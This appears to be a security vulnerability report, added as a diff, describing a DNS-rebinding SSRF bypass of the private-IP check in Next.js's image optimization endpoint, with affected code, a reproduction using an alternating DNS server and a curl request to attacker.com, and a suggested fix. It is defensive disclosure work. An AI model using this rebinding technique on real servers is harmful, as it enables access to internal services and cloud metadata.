@@ -1,0 +1,79 @@
+I am writing to report a security vulnerability in the Next.js image optimization endpoint.
+
+Summary
+
+The /_next/image endpoint validates that remote image URLs don't resolve to private IPs, but uses the hostname (not the validated IP) for the actual fetch. This creates a TOCTOU window where DNS rebinding bypasses the isPrivateIp() check.
+
+Impact
+
+An attacker with a domain whitelisted in remotePatterns can bypass the isPrivateIp() validation and make the Next.js server connect to any arbitrary IP address. This includes private IPs (127.0.0.1, 10.x.x.x, 169.254.169.254), but also any external IP the attacker chooses. The private IP protection is completely defeated.
+
+Affected Code
+
+packages/next/src/server/image-optimizer.ts lines 720-738:
+
+  // Line 720: DNS lookup for validation
+  const records = await lookup(hostname, { all: true })
+  if (privateIps.length > 0) throw new ImageError(...)
+
+  // Line 738: fetch() does its own DNS lookup
+  const res = await fetch(href, ...)
+
+The validated IP is never used. fetch() re-resolves the hostname.
+
+Reproduction
+
+Tested on self-hosted Next.js 16.0.7.
+
+1. Target Configuration
+
+next.config.ts includes attacker-controlled domain:
+
+  images: {
+    remotePatterns: [{ hostname: 'attacker.com' }]
+  }
+
+2. Attacker DNS Server Setup
+
+Custom DNS server alternates responses per query:
+
+  Query 1-2: Return 8.8.8.8 (public IP - passes isPrivateIp check)
+  Query 3-4: Return 127.0.0.1 (private IP - SSRF to localhost)
+
+3. Internal Service Setup
+
+Simulated internal service on target server:
+
+  python3 -m http.server 8081 --bind 127.0.0.1
+
+4. Attack Request
+
+  curl "http://target.com/_next/image?url=http://attacker.com:8081/internal&w=64&q=75"
+
+5. DNS Server Logs
+
+  [client] Q1 -> 8.8.8.8   (validation lookup - passes)
+  [client] Q2 -> 8.8.8.8   (validation lookup)
+  [client] Q3 -> 127.0.0.1 (fetch lookup - SSRF!)
+  [client] Q4 -> 127.0.0.1 (fetch lookup)
+
+6. Result
+
+  Response: "The requested resource isn't a valid image."
+
+This error confirms Next.js connected to 127.0.0.1:8081 and received a response. The error occurs because the internal resource is text, not an image - but the SSRF succeeded.
+
+Suggested Fix
+
+Use the validated IP directly instead of re-resolving the hostname:
+
+  const url = new URL(href)
+  url.hostname = ips[0]
+  const res = await fetch(url.toString(), {
+    headers: { Host: new URL(href).hostname }
+  })
+
+Notes
+
+- Verified on Next.js 16.0.7 self-hosted
+- Vercel has additional platform-level DNS filtering that blocks this at the router layer
